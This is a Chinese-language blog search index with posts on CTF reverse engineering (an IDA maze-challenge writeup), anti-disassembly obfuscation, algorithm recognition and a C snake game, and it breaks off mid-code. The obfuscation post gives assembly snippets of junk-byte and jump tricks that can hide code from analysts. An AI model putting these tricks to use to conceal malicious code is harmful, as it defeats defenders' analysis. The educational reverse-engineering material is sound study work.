<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>逆向做题总结</title>
      <link href="/2023/09/15/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E9%80%86%E5%90%91%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2023/09/15/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E9%80%86%E5%90%91%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="软件使用技巧"><a href="#软件使用技巧" class="headerlink" title="软件使用技巧"></a>软件使用技巧</h1><h2 id="IDA变量分析错误"><a href="#IDA变量分析错误" class="headerlink" title="IDA变量分析错误"></a>IDA变量分析错误</h2><p>2023.9.15</p><p>使用IDA进行分析时发现一些奇怪的代码,特别是有一些奇怪的指针强转(例如引用char数组的元素时强转为_DWORD*)时要去注意看IDA中变量的类型有无错误,多余,缺失.</p><h3 id="例题—BUUCTF-不一样的flag"><a href="#例题—BUUCTF-不一样的flag" class="headerlink" title="例题—BUUCTF-不一样的flag"></a>例题—BUUCTF-不一样的flag</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IDA 分析出</span></span><br><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">29</span>]; <span class="comment">// [esp+17h] [ebp-35h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+38h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">  _BYTE v7[<span class="number">12</span>]; <span class="comment">// [esp+40h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;*11110100001010000101111#&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right\n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      --*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &lt; <span class="number">0</span> || *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">49</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意<code>--*(_DWORD *)&amp;v3[25];</code>这行代码<br>实际上存储地图(分析题意得知是一个走迷宫游戏)的只有5<em>5,也就是0-24的下标.<br>且v3[25]的地址被强转为int</em>,也就是说原本的v3[25-28]这4个字节其实是一个单独的变量,实际上就是当前所在行row,<br>所以v3的类型应该被改成<code>char v3[25];</code>而不是<code>char v3[29];</code></p><p>注意<code>if ( *(int *)&amp;v3[4 * i + 25] &lt; 0 || *(int *)&amp;v3[4 * i + 25] &gt; 4 )</code>这行代码<br>首先把v4重命名成col,<br>前面把v3[25-28]这4个字节修改成row后变成<code>if ( *(&amp;v4 + i) &lt; 0 || *(&amp;v4 + i) &gt; 4 )</code>,<br>更能看出问题—这个循环只有两次,实际上就是判断row和col两个变量是否 &lt;0 或 &gt;4<br>不过这里是代码分析,并不是变量分析错误的问题</p><p>注意<code>if ( v7[5 * *(_DWORD *)&amp;v3[25] - 41 + v4] == 35 )</code>这行代码<br>有_BYTE v7[12];这个数组,但我们只用了v8的地址,那么再根据这个函数的局部变量分布和5*5的地图这个信息,即:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(...)</span>&#123;</span><br><span class="line">    <span class="type">char</span> v3[<span class="number">25</span>]; <span class="comment">// [esp+17h] [ebp-35h] BYREF //已修改</span></span><br><span class="line">    <span class="type">int</span> row; <span class="comment">// [esp+30h] [ebp-1Ch] //新生成的int变量</span></span><br><span class="line">    <span class="type">int</span> col; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [esp+38h] [ebp-14h] BYREF</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">    _BYTE v8[<span class="number">12</span>]; <span class="comment">// [esp+40h] [ebp-Ch] BYREF</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么有4x4+25&#x3D;41个字节的向前偏移,即v3[25]的25个字节,v4,v5,v6,i的16个字节<br>所以代码可以修改为<code>if ( v7[5 * row + col] == &#39;#&#39; )</code>,实际上就是把v3当做5*5的二维数组来使用<br>这样整个代码就非常清晰了</p>]]></content>
      
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码保护和混淆</title>
      <link href="/2023/09/15/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4%E5%92%8C%E6%B7%B7%E6%B7%86/"/>
      <url>/2023/09/15/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4%E5%92%8C%E6%B7%B7%E6%B7%86/</url>
      
        <content type="html"><![CDATA[<h1 id="抵御静态分析"><a href="#抵御静态分析" class="headerlink" title="抵御静态分析"></a>抵御静态分析</h1><p>对于二进制程序分析,工具都要先进行反汇编,所以要进行抵御,可以对汇编进行特殊处理来干扰工具的分析</p><h2 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h2><h3 id="函数头处增加pushfd-popfd和nop指令"><a href="#函数头处增加pushfd-popfd和nop指令" class="headerlink" title="函数头处增加pushfd,popfd和nop指令"></a>函数头处增加pushfd,popfd和nop指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">;常规的函数头</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br><span class="line"></span><br><span class="line">;加上花指令后</span><br><span class="line">push ebp</span><br><span class="line">pushfd</span><br><span class="line">add esp,0xd</span><br><span class="line">nop</span><br><span class="line">sub esp 0xd</span><br><span class="line">popfd</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br><span class="line"></span><br><span class="line">;pushfd和popfd等指令会混淆逆向工具的栈指针解析</span><br></pre></td></tr></table></figure><h3 id="插入脏字节并设置跳转"><a href="#插入脏字节并设置跳转" class="headerlink" title="插入脏字节并设置跳转"></a>插入脏字节并设置跳转</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">jmp addr1 ;跳转到下面以保持正常的运行</span><br><span class="line">db 0xe8 ;脏字节,并且这个0xe8是call指令的起始字节,会让反汇编器认为这里是一条call指令</span><br><span class="line">addr1:</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br></pre></td></tr></table></figure><h3 id="条件跳转来干扰递归下降反汇编器"><a href="#条件跳转来干扰递归下降反汇编器" class="headerlink" title="条件跳转来干扰递归下降反汇编器"></a>条件跳转来干扰递归下降反汇编器</h3><p>递归下降反汇编器虽然部分模拟了程序执行的控制流过程,但是并不是真正的运行,不能获取所有的信息,</p><p>利用这点插入条件跳转来让其反汇编所有的分支,这样就会导致0xe8被解析为指令,导致错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">jz addr1</span><br><span class="line">jnz addr1 ;实际上是成为了无条件跳转</span><br><span class="line">db 0xe8</span><br><span class="line">addr1:</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br></pre></td></tr></table></figure><h3 id="同时将代码打乱顺序"><a href="#同时将代码打乱顺序" class="headerlink" title="同时将代码打乱顺序"></a>同时将代码打乱顺序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">jz addr3</span><br><span class="line">jnz addr3 ;实际上是成为了无条件跳转</span><br><span class="line">db 0xe8</span><br><span class="line">addr3:</span><br><span class="line">sub esp,0x100</span><br><span class="line">...</span><br><span class="line">addr2:</span><br><span class="line">mov ebp,esp</span><br><span class="line">jmp addr3</span><br></pre></td></tr></table></figure><h3 id="指令替换"><a href="#指令替换" class="headerlink" title="指令替换"></a>指令替换</h3><p>将一些指令替换为另一组相同或相似效果的指令来混淆,虽然程序效果没有变化,但是特殊的指令会让反汇编器出现错误</p><p>例如call,ret指令会让反汇编器解析出的函数地址范围和调用关系出现错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;call指令</span><br><span class="line">call addr</span><br><span class="line">;可替换为</span><br><span class="line">push addr</span><br><span class="line">ret</span><br><span class="line">;ret 进一步替换为(前提是ecx没有在使用)</span><br><span class="line">push ecx</span><br><span class="line">mov ecx,[esp+4]</span><br><span class="line">add esp,8</span><br><span class="line">jmp ecx</span><br></pre></td></tr></table></figure><h3 id="代码自修改-SMC"><a href="#代码自修改-SMC" class="headerlink" title="代码自修改(SMC)"></a>代码自修改(SMC)</h3><p>SMC技术会对程序特定部分在运行时进行特定的处理,并被使用函数指针来作为代码直接调用</p><p>常见于壳类程序中,静态分析时IDA等工具会将处理前的部分解析为数据,导致错误</p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>加密壳程序分为<code>数据加密,代码加密,算法加密</code></p><p>数据加密一般是在合适的时机对程序中已有的数据进行即时的解密</p><p>代码加密同理,例如SMC技术</p><p>算法加密偏重算法的混淆,模糊与隐藏,例如VM虚拟机保护</p><h1 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h1>]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见算法识别</title>
      <link href="/2023/09/14/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E8%AF%86%E5%88%AB/"/>
      <url>/2023/09/14/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E8%AF%86%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="特征值识别"><a href="#特征值识别" class="headerlink" title="特征值识别"></a>特征值识别</h1><p>许多常见算法会使用一些常量,如AES,DES等,为了提高效率,常常被硬编码在程序中,所以可以通过识别这些常量来推测程序是否使用了该算法.</p><p>例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/2183824-20210712212520283-1123075736.png" alt="img"></p><p>IDA中的FindCrypt插件,PEiD的KANAL可以查找特征值</p><h2 id="特征运算识别"><a href="#特征运算识别" class="headerlink" title="特征运算识别"></a>特征运算识别</h2><p>特定的算法会有与之对应的运算,特征值不足以识别的时候,可以尝试分析程序中使用了那些特征运算,来进行算法的识别</p><p>例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/2183824-20210712215155442-1406369467.png" alt="img"></p><h1 id="第三方库识别"><a href="#第三方库识别" class="headerlink" title="第三方库识别"></a>第三方库识别</h1><h2 id="字符串识别"><a href="#字符串识别" class="headerlink" title="字符串识别"></a>字符串识别</h2><p>许多第三方库都会将自己的版权信息,使用到的字符串(报错信息等)以字符串写入库,静态编译时,可以在二进制程序中找到这些信息,即可判断使用了哪些第三方库</p><h2 id="函数签名识别"><a href="#函数签名识别" class="headerlink" title="函数签名识别"></a>函数签名识别</h2><p>库对应一系列函数,可通过特定的函数签名来识别具体的函数,可以使用IDA的签名识别功能来进行查找,同时若IDA没有预置需要识别的库函数签名,则可以上网查找需要的函数签名库进行导入,或者使用IDA SDK中提供的FLAIR工具,根据已有的静态库文件来生成一份签名</p><h2 id="二进制比对识别"><a href="#二进制比对识别" class="headerlink" title="二进制比对识别"></a>二进制比对识别</h2><p>可以使用BinDiff工具来对二进制程序A(要分析的程序)和二进制程序B(自行找到的一个包含特定信息的程序)进行比较分析.</p><p>如果已知了A使用了某特定库,但是因为环境不同等原因不能完全匹配,这时可以找另外一个已经使用了该库的程序进行比对,来查看相似度,相似度达0.99的大概率是相同函数</p>]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言贪吃蛇</title>
      <link href="/2023/09/08/CC++%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0%E5%92%8C%E9%A1%B9%E7%9B%AE/%E8%B4%AA%E5%90%83%E8%9B%87/"/>
      <url>/2023/09/08/CC++%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0%E5%92%8C%E9%A1%B9%E7%9B%AE/%E8%B4%AA%E5%90%83%E8%9B%87/</url>
      
        <content type="html"><![CDATA[<h1 id="游戏说明"><a href="#游戏说明" class="headerlink" title="游戏说明"></a>游戏说明</h1><p>本代码实现了Windows下(使用了Win API)基于c语言的控制台运行的贪吃蛇游戏.</p><p>代码行数: 537行</p><p>文件包括:<br>game.c 游戏运行逻辑支持<br>main.c 主函数控制<br>menu.c 菜单选择控制<br>snake.h 声明头文件<br>system.c 系统支持相关</p><p>细节描述:<br>实现菜单选择,游戏基本元素,自定义游戏设置,完善用户交互,处理用户错误输入</p><h1 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h1><h2 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110606510.png" alt="image-20230908110606510"></p><h2 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h2><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110640008.png" alt="image-20230908110640008" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110652950.png" alt="image-20230908110652950" style="zoom:33%;" /><h2 id="游戏开始"><a href="#游戏开始" class="headerlink" title="游戏开始"></a>游戏开始</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110721287.png" alt="image-20230908110721287"></p><h2 id="结算界面"><a href="#结算界面" class="headerlink" title="结算界面"></a>结算界面</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110739259.png" alt="image-20230908110739259"></p><h1 id="代码详解"><a href="#代码详解" class="headerlink" title="代码详解"></a>代码详解</h1><p>注:代码中一些函数进行了简化和适当的省略,主要为了体现代码的逻辑</p><h2 id="游戏数据结构—game-c"><a href="#游戏数据结构—game-c" class="headerlink" title="游戏数据结构—game.c"></a>游戏数据结构—game.c</h2><p>使用一个双向链表来存储蛇,使用一个包含一个坐标对的结构体来存储苹果的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// 以下在snake.h头文件中</span></span><br><span class="line"><span class="comment">#define bool int // 纯c语言,没有bool类型,需要宏定义bool类型</span></span><br><span class="line"><span class="comment">#define false 0 // 将true和false作为对应到1和0的宏</span></span><br><span class="line"><span class="comment">#define true 1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//游戏数据</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">snake</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">snake</span> *<span class="title">prior</span>, *<span class="title">next</span>;</span></span><br><span class="line">&#125; snake;<span class="comment">//蛇身体的一个结点的类型</span></span><br><span class="line">snake *head, *tail;<span class="comment">//指向蛇头和蛇尾结点的指针</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">APPLE</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">&#125; apple;<span class="comment">//苹果的坐标数据</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> score, pre_x, pre_y, wait = <span class="number">500</span>;<span class="comment">//得分;前一个x,y坐标;等待时长(和游戏难度有关---改变蛇移动的速度)</span></span><br><span class="line"><span class="type">int</span> HEIGHT = <span class="number">30</span>;<span class="comment">//地图高度</span></span><br><span class="line"><span class="type">int</span> WIDTH = <span class="number">30</span>;<span class="comment">//地图宽度</span></span><br><span class="line"><span class="type">int</span> curSnakeLen = <span class="number">0</span>;<span class="comment">//当前的蛇身长度</span></span><br><span class="line"><span class="type">int</span> maxSnakeLen = <span class="number">0</span>;<span class="comment">//地图能容纳的最大蛇身长度,达到这个长度意味着游戏胜利</span></span><br></pre></td></tr></table></figure><h2 id="游戏控制—main-c"><a href="#游戏控制—main-c" class="headerlink" title="游戏控制—main.c"></a>游戏控制—main.c</h2><p>头文件包含</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span> <span class="comment">// Console Input/Output,定义了通过控制台进行数据输入和数据输出的函数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;snake.h&quot;</span> <span class="comment">// 包含了所有的函数声明,和为了与c++兼容设置的bool宏</span></span></span><br></pre></td></tr></table></figure><p>代码逻辑</p><p>使用一个while(1)循环来重复开始游戏,从而实现一局游戏结束后可以回到主菜单准备下一次游戏</p><p>在循环中使用一个char c;配合_getch()来进行菜单选择,同时对于错误输出专门使用一个函数来处理</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">printMenu();<span class="comment">//第一次进入循环前先初始化一次菜单</span></span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;<span class="comment">//控制主循环</span></span><br><span class="line">gotoxy(<span class="number">37</span>, <span class="number">17</span>);<span class="comment">//定位到输入栏</span></span><br><span class="line">c = _getch();<span class="comment">//vs2022要求将getch()更换为_getch()---标准c编译器换回getch()(?)</span></span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">initGame();<span class="comment">//游戏数据初始化</span></span><br><span class="line">start();<span class="comment">//正式开始一局游戏</span></span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);<span class="comment">//游戏结束清屏</span></span><br><span class="line">printMenu();<span class="comment">//重新打印菜单</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">color(<span class="number">7</span>);<span class="comment">//将颜色设置回白色</span></span><br><span class="line">gotoxy(<span class="number">0</span>, <span class="number">18</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;游戏结束!\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">//跳出循环,结束游戏</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> wrongInput();<span class="comment">//输入非法,打印错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="菜单选择—menu-c"><a href="#菜单选择—menu-c" class="headerlink" title="菜单选择—menu.c"></a>菜单选择—menu.c</h2><p>包含了菜单界面的图形打印,用户错误输入处理,以及游戏初始化的调用接口</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">printMenu</span><span class="params">()</span>; <span class="comment">// 打印菜单,其中利用了gotoxy()函数进行控制台光标的跳转</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initGame</span><span class="params">()</span> &#123;<span class="comment">// 初始化各项数据,这些函数在game.c中定义</span></span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>); <span class="comment">// 清屏</span></span><br><span class="line">setDifficulty(); <span class="comment">// 设置游戏难度</span></span><br><span class="line">printBox(); <span class="comment">//打印界面</span></span><br><span class="line">initSnakeAndApple(); <span class="comment">//初始化游戏数据---蛇和苹果的初始状态</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">wrongInput</span><span class="params">()</span> &#123;<span class="comment">//处理错误的键盘输入---打印报错信息</span></span><br><span class="line">gotoxy(<span class="number">43</span>, <span class="number">17</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入错误!&quot;</span>);</span><br><span class="line">Sleep(<span class="number">1000</span>);<span class="comment">//停顿一秒后清除信息</span></span><br><span class="line">gotoxy(<span class="number">43</span>, <span class="number">17</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;         &quot;</span>);</span><br><span class="line">gotoxy(<span class="number">39</span>, <span class="number">17</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="系统相关支持—system-c"><a href="#系统相关支持—system-c" class="headerlink" title="系统相关支持—system.c"></a>系统相关支持—system.c</h2><p>因为是一定程度上基于Windows的程序(主要是一些优化和完善,还有关键的光标跳转),需要使用一些win API函数</p><p>使用_kbhit()来实现检测按键</p><p>头文件包含:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span> <span class="comment">// Win API支持</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span 